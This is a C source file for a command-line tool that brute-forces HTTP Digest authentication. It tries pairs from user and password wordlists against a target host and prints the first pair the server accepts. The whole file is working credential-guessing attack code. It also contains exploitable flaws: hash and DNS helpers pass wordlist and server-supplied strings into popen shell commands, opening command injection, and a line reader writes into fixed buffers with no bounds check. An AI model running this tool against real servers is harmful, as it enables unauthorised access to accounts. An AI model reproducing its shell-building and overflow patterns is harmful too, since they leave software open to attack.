/*
 * HTTP Digest Access Authentication Cracker
 *
 * Main source file
 *
 *
 * using linux's md5sum
 * using own dns for resolving
 *
 * Copyright Tiago Teixeira, 2017
 *
*/
#include <stdio.h>
#include <string.h>
#include <bsd/string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>

#include "http_digest_crk.h"
#include "parser.h"

int main(int argc,char**argv)
{
	// crack and stuff
	struct args args;
	if(parse_args(argc,argv,&args))
		return 1;
	int sock;
	int h;
	char ha1[33],ha2[33],response[33]; // 32 hex chars, plus sentinel
	int nc;	// nonce count
	int cnonce;	//client nonce
	char user[16],pass[32];
	struct sockaddr_in remote;
	struct digest_info info;
	char *buffer;
	// stats
	time_t init_time,end_time;
	// init stuff
	memset(ha1,0,33);
	memset(ha2,0,33);
	memset(response,0,33);
	memset(user,0,16);
	memset(pass,0,32);
	memset(&remote,0,sizeof remote);
	remote.sin_family = AF_INET;
	remote.sin_port = htons(args.port);
	if(args.verbose)
		printf("using port %hd\n",args.port);
	if((remote.sin_addr.s_addr = dns(args.hostname))==(unsigned int)-1)
	{
		fprintf(stderr,"Could not resolve hostname\n");
		fclose(args.userf);
		fclose(args.passf);
		return 1;
	}
	sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(sock<0)
	{
		fprintf(stderr,"Could not create socket\n");
		fclose(args.userf);
		fclose(args.passf);
		return 1;
	}
	buffer=(char*)malloc(4096);	// should be enough
	if(buffer==NULL)
	{
		fprintf(stderr,"Could not allocate memory\n");
		close(sock);
		fclose(args.userf);
		fclose(args.passf);
		return 1;
	}
	if(args.verbose)
		printf("Starting initial test...\n");
	// initial test
	sprintf(buffer,"GET / HTTP/1.1\r\nHost: %s\r\n\r\n",args.hostname);
	if(connect(sock,(struct sockaddr*)&remote,sizeof remote))
	{
		fprintf(stderr,"Could not connect to remote\n");
		free(buffer);
		close(sock);
		fclose(args.userf);
		fclose(args.passf);
		return 1;
	}
	if(send(sock,buffer,strlen(buffer),0)<0)
	{
		fprintf(stderr,"Could not send to remote\n");
		free(buffer);
		close(sock);
		fclose(args.userf);
		fclose(args.passf);
		return 1;
	}
	memset(buffer,0,4096);
	if(recv(sock,buffer,4095,0)<0)	// in case of not enough buffer, keep the '0' sentinel
	{
		fprintf(stderr,"Could not receive from remote\n");
		free(buffer);
		close(sock);
		fclose(args.userf);
		fclose(args.passf);
		return 1;
	}
	// really 401?
	if(strncmp("HTTP/1.1 401",buffer,12))
	{
		printf("Page not unathorized\n");
		*(buffer+12)=0;		// avoid warnings with 'write(stdin...'
		printf("%s\n",buffer);
		*(buffer+12)=0;
		free(buffer);
		close(sock);
		fclose(args.userf);
		fclose(args.passf);
		return 0;
	}
	if(args.verbose)
		printf("Got a 401 unauthorized error\n");
	info = parse_http(buffer);
	if(info.info&P_ERROR)
	{
		free(buffer);
		close(sock);
		fclose(args.userf);
		fclose(args.passf);
		return 1;
	}
	
	// first test complete
	srand(time(NULL));	// random for cnonce calcs
	nc = 0;
	init_time = time(NULL);
	// main loop
	while(!readline(args.userf,user))
	{
		while(!readline(args.passf,pass))
		{
			// response loop
			nc++;

			// HA1 calculation
			// reuse buffer
			sprintf(buffer,"%s:%s:%s",user,info.realm,pass);
			md5(buffer,ha1);
			
			// HA2 calculation
			sprintf(buffer,"GET:/");
			md5(buffer,ha2);

			// RESPONSE calcs
			if(info.info&0x3)	// both auth and auth_int
			{
				cnonce = random();
				sprintf(buffer,"%s:%s:%08x:%08x:%s:%s", ha1, info.nonce, nc, cnonce, info.info&QOP_AUTH ? "auth" : "auth-int", ha2);
				md5(buffer,response);
			}
			else
			{
				sprintf(buffer,"%s:%s:%s",ha1,info.nonce,ha2);
				md5(buffer,response);
			}

			// create final request header
			sprintf(buffer,"GET / HTTP/1.1\r\nHost: %s\r\nAuthorization: Digest username=\"%s\", realm=\"%s\", nonce=\"%s\", uri=\"/\", ",args.hostname,user,info.realm,info.nonce);
			h=strlen(buffer);	// for the future
			if(info.info&0x3)	// any qop
			{
				sprintf(buffer+h,"qop=%s, cnonce=\"%08x\", nc=\"%08x\", ",info.info&QOP_AUTH?"auth":"auth-int", cnonce, nc);
			}
			h=strlen(buffer);	// to add the response
			sprintf(buffer+h,"response=\"%s\"\r\n\r\n",response);

			// free resources
			free_info(&info);

			if(args.verbose)
				printf("Testing %s:%s\n",user,pass);

			// send it now
			if(send(sock,buffer,strlen(buffer),0)<0)
			{
				fprintf(stderr,"Error sending");
				free(buffer);
				close(sock);
				fclose(args.userf);
				fclose(args.passf);
				return 1;
			}
			if(args.verbose)
				printf("%s",buffer);
			memset(buffer,0,4096);
			if(recv(sock,buffer,4095,0)<0)
			{
				fprintf(stderr,"Error receiving\n");
				free(buffer);
				close(sock);
				fclose(args.userf);
				fclose(args.passf);
				return 1;
			}

			// initial parse
			if(strncmp("HTTP/1.1 401",buffer,12))
			{
				// cool
				end_time=time(NULL);
				printf("Process terminated with credentials %s:%s\n",user,pass);
				printf("Took %ld seconds\n",end_time-init_time);
				free(buffer);
				close(sock);
				fclose(args.userf);
				fclose(args.passf);
				return 0;
			}

			info = parse_http(buffer);
		}
		// next user
		fseek(args.passf,0,SEEK_SET);
	}

	free_info(&info);

	// while loops're finished
	// nothing found
	end_time=time(NULL);
	printf("Process terminated with no credentials found\n");
	printf("Took %ld seconds\n",end_time-init_time);
	free(buffer);
	close(sock);
	fclose(args.userf);
	fclose(args.passf);
	return 0;
}

void free_info(struct digest_info *a)
{
	free(a->realm);
	free(a->nonce);
}

struct digest_info parse_http(char*hdr)
{
	struct digest_info info;
	char *c,*h;
	int i;	// might turn useful
	
	memset(&info,0,sizeof info);
	
	// check for digest
	if(strstr(hdr,"WWW-Authenticate: Digest")==NULL)
	{
		fprintf(stderr,"No Digest Found\n");
		info.info |= P_ERROR;
		return info;
	}

	// qop
	c=strstr(hdr,"qop");
	if(c!=NULL)
	{
		c+=4; // advance for qop=<here>
		// find next "
		h=strchr(c+1,'\"');
		// get difference
		i=h-c;
		
		if(strstr(c,"auth-int")!=NULL)
			info.info |= QOP_AUTH_INT;
		
		if(strstr(c,"auth,")!=NULL || strstr(c,"auth\"")!=NULL)	// looking only for 'auth'
			info.info |= QOP_AUTH;
	}
	
	// realm
	c=strstr(hdr,"realm");
	if(c==NULL)
	{
		fprintf(stderr,"No realm found\n");
		info.info|=P_ERROR;
		return info;
	}
	c+=7;	// realm="<here>
	h=strstr(c,"\"");	// look for closing quote
	i = h-c;	// size of realm string
	info.realm = (char*)malloc(i+1);
	if(info.realm==NULL)
	{
		fprintf(stderr,"Memory allocation error\n");
		info.info|=P_ERROR;
		return info;
	}
	memcpy(info.realm,c,i);
	*(info.realm+i)=0;	// sentinel
	
	// nonce
	c=strstr(hdr,"nonce");
	if(c==NULL&&(info.info&0x3))
	{
		fprintf(stderr,"No nonce found\n");
		info.info|=P_ERROR;
		return info;
	}
	c+=7;	// nonce="<here>
	h=strstr(c,"\"");
	i=h-c;
	info.nonce = (char*)malloc(i+1);
	if(info.nonce == NULL)
	{
		fprintf(stderr,"Memory allocation error\n");
		info.info |= P_ERROR;
		return info;
	}
	memcpy(info.nonce,c,i);
	*(info.nonce+i)=0;	// sentinel

	// all basic stuff
	return info;
}

int dns(const char*name)
{
	char cmd[64];
	int i=0;
	FILE*out;
	
	sprintf(cmd,"%s %s",DNS,name);	// DNS constant on header file
	out = popen(cmd,"r");
	if(out==NULL)return 1;	// error
	// reuse cmd[]
	while(fread(cmd+i,1,1,out))i++; // read from popen
	// sentinel
	*(cmd+i)=0;
	pclose(out);
	// finally return
	return inet_addr(cmd);
}

int md5(const char*in,char*out)
{
	char cmd[1024];
	FILE*outf;
	
	sprintf(cmd,"echo -n %s | md5sum",in);	// essential -n option for echo
	outf = popen(cmd,"r");
	if(outf==NULL)return 1;	// error
	if(fread(out,1,32,outf)!=32)
	{
		pclose(outf);
		return 1;
	}
	*(out+32)=0;	// sentinel
	pclose(outf);
	return 0;	// Okay
}

int readline(FILE*f,char*buf)
{
	int i=0;
	char ph; // PlaceHolder, avoid possible misuse of pointers
	while(fread(&ph,1,1,f))
	{
		if(ph==EOF)return 1;	// not necessary?
		if(ph=='\r')*(buf+i)='\0';
		else if(ph=='\n')
		{
			/* not good for MacOSX users tho */
			//printf("%s\n",buf);
			*(buf+i)='\0';
			return 0;
		}
		else *(buf+i)=ph;
		i++;
	}
	/* returns error on EOF
	   all lines should be terminated with '\n'
	   or last user/pass could not be used */
	return 1;
}

int init_socket(int old)
{
	// closes old socket and
	// inits a new one
	close(old);
	int s = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	return s;
}
